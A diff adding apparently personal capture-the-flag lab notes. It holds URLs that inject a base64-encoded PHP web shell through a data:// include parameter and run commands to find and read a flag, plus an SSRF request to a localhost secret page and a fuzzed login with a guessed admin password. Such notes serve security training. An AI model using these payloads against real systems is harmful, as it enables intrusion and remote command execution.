@@ -272,3 +272,20 @@ Array
 http://10.8.32.1:42794/f9e50ba29bb03603f0d725872ea9df13/3e0510e2c174137b0e77bdbbcfc807b0/admin/index.php?config=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=dir
 http://10.8.32.1:42793/f9e50ba29bb03603f0d725872ea9df13/3e0510e2c174137b0e77bdbbcfc807b0/admin/index.php?config=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=find%20/%20|%20grep%20flag
 http://10.8.32.1:42794/f9e50ba29bb03603f0d725872ea9df13/3e0510e2c174137b0e77bdbbcfc807b0/admin/index.php?config=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=cat%20/var/www/html/f9e50ba29bb03603f0d725872ea9df13/.../.flag
+
+task 65
+
+using burp: 
+
+GET /index.php?image_url=http://127.0.0.1/secret.php HTTP/1.1
+
+(http://10.8.32.1:42795/index.php?image_url=http://127.0.0.1/secret.php) will not show result
+
+
+task 66
+
+http://10.8.32.1:42792/null.php (found by fuzzing all directories .php)
+
+username=administrator&password=111111   (from status code 200 to 302)
+
+
